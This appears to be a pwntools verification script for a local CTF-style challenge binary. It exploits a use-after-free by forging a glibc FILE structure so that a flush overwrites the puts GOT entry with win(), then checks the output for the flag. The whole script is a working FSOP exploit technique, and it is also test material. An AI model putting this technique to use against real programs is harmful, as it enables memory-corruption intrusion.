#!/usr/bin/env python3
"""Manual verification: FSOP GOT overwrite → win() on fsop_win_x64 (Partial RELRO)."""

from __future__ import annotations

import os
import sys

from pwn import ELF, PIPE, FileStructure, context, p64, process

context.arch = "amd64"
context.log_level = "error"


def main() -> int:
    root = os.path.join(os.path.dirname(__file__), "..")
    binary = os.path.abspath(os.path.join(root, "tests/challenges/fsop_win_x64"))
    if not os.path.isfile(binary):
        print(f"missing {binary}; run: make -C tests/challenges fsop_win_x64", file=sys.stderr)
        return 1

    elf = ELF(binary)
    if elf.relro != "Partial":
        print(
            "expected Partial RELRO for GOT overwrite; "
            "check tests/challenges/Makefile CFLAGS_FSOP",
            file=sys.stderr,
        )
        return 1

    # Avoid default PTY allocation (fails in some CI / constrained environments).
    p = process(binary, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    p.recvuntil(b"win is at ")
    win = int(p.recvline().strip(), 16)
    p.recvuntil(b"file_ptr is at ")
    file_ptr = int(p.recvline().strip(), 16)
    p.recvuntil(b"notes[0] holds ")
    p.recvline()
    p.recvuntil(b"> ")

    elf.address = win - elf.sym["win"]
    got_puts = elf.got["puts"]

    # UAF: free FILE chunk, still editable via notes[0]
    p.sendline(b"2")
    p.sendlineafter(b"index: ", b"0")
    p.recvuntil(b"> ")

    fp = FileStructure(null=0)
    fp.flags = 0xFBAD8000  # _IO_CURRENTLY_PUTTING etc. — fflush write path
    fp._IO_write_base = got_puts
    fp._IO_write_ptr = got_puts + 8
    fp._IO_write_end = got_puts + 8
    fp._IO_buf_base = file_ptr + 0xE0
    fp._IO_buf_end = file_ptr + 0x100
    fp.fileno = 1

    buf = bytearray(bytes(fp).ljust(0x100, b"\x00"))
    buf[0xE0:0xE8] = p64(win)

    p.sendline(b"3")
    p.sendlineafter(b"index: ", b"0")
    p.send(bytes(buf))
    p.recvuntil(b"> ")

    p.sendline(b"5")  # flush
    p.recvuntil(b"> ")

    p.sendline(b"6")  # puts("nice try") → win if GOT patched
    data = p.recv(timeout=2)
    if b"FLAG{fsop_win_master}" in data:
        print("ok: flag from win()")
        p.close()
        return 0
    print("fail: output:", data[:500], file=sys.stderr)
    p.close()
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
